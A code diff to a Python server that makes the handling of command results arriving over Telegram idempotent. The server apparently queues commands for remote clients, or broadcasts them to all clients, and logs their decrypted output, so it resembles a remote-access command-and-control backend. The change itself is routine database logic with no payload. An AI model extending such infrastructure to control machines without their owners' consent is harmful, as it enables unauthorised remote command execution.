@@ -215,7 +215,7 @@ def save_command_to_db(command, client_id, status="pending", cwd=None):
 
 
 def _telegram_apply_result_to_commands_db(client_id: str, result_obj: dict, decrypted_for_log: str) -> None:
-    """Update pending command row from Telegram RESULT (matches by command_id or client_id / broadcast)."""
+    """Update pending command row from Telegram RESULT — idempotent (duplicate deliveries ignored)."""
     cmd_text = result_obj.get("command", "") or ""
     result_txt = result_obj.get("result", "") or ""
     cmd_cwd = result_obj.get("cwd")
@@ -225,39 +225,64 @@ def _telegram_apply_result_to_commands_db(client_id: str, result_obj: dict, decr
     except (TypeError, ValueError):
         cid_row = None
 
+    def _touch_last_seen_only() -> None:
+        if client_id in clients:
+            clients[client_id]["last_seen"] = time.time()
+            _persist_client_last_seen_db(client_id)
+
     try:
         conn = sqlite3.connect(DB_PATH)
+        row_id_to_update = None
+
         if cid_row is not None:
             row = conn.execute(
                 'SELECT id FROM commands WHERE id=? AND status="pending"',
                 (cid_row,),
             ).fetchone()
+            if row:
+                row_id_to_update = row[0]
+            else:
+                done = conn.execute('SELECT status FROM commands WHERE id=?', (cid_row,)).fetchone()
+                conn.close()
+                if done and done[0] == 'done':
+                    logger.debug("Ignoring duplicate TG result (already done) command_id=%s", cid_row)
+                    _touch_last_seen_only()
+                    return
+                logger.warning(
+                    "TG result: no pending row for command_id=%s client=%s — ignoring",
+                    cid_row,
+                    client_id,
+                )
+                _touch_last_seen_only()
+                return
         else:
             row = conn.execute(
                 'SELECT id FROM commands WHERE status="pending" AND (client_id=? OR client_id=?) '
                 'ORDER BY created_at ASC LIMIT 1',
                 (client_id, "all"),
             ).fetchone()
-        if row:
-            conn.execute(
-                'UPDATE commands SET status="done", result=?, executed_at=?, cwd=? WHERE id=?',
-                (result_txt, time.time(), cmd_cwd, row[0]),
-            )
-        else:
-            conn.execute(
-                'INSERT INTO commands (command, client_id, status, result, created_at, executed_at, cwd) '
-                'VALUES (?,?,?,?,?,?,?)',
-                (cmd_text, client_id, "done", result_txt, time.time(), time.time(), cmd_cwd),
-            )
+            if row:
+                row_id_to_update = row[0]
+            else:
+                conn.close()
+                logger.debug(
+                    "Ignoring duplicate TG result (no pending row) client=%s",
+                    client_id,
+                )
+                _touch_last_seen_only()
+                return
+
+        conn.execute(
+            'UPDATE commands SET status="done", result=?, executed_at=?, cwd=? WHERE id=?',
+            (result_txt, time.time(), cmd_cwd, row_id_to_update),
+        )
         conn.commit()
         conn.close()
     except Exception as db_err:
         logger.error(f"TG result DB error: {db_err}")
         return
 
-    if client_id in clients:
-        clients[client_id]["last_seen"] = time.time()
-        _persist_client_last_seen_db(client_id)
+    _touch_last_seen_only()
     save_log_to_db(time.time(), "result", decrypted_for_log, client_id)
     logger.info(f"📥 TG Result from {client_id}: {cmd_text[:60]}")
 
